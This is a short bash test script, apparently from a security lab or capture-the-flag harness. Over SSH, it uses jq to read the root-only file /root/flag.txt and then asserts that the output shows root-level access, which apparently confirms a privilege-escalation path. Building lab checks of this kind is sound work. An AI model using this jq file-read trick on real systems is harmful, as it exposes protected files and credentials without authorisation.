#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '/usr/bin/jq -R . /root/flag.txt | tr -d \"\"')"
assert_root_output "${out}"
